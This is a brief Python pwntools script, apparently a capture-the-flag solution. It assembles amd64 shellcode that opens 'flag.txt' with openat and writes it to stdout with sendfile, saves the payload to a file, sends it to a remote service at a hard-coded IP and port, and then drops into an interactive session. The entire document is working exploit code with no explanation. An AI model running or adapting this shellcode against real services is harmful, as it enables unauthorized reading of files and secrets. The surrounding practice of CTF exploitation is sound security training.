from pwn import *
SC = """
    mov rsi, rdx
    add rsi, 52
	mov rax, 257
    mov rdi, -100
    xor rdx, rdx
    syscall
    mov rsi, rax
    mov rax, 40
    mov rdi, 1
    mov r10, 100
    syscall
	"""
context.arch="amd64"

payload = b"9\x00"
payload += asm(SC)
print(len(asm(SC)))

payload += b"flag.txt\x00"
p = remote("46.101.25.63",32501)
f = open("payload","wb")
f.write(payload)
p.sendline(payload)

p.interactive()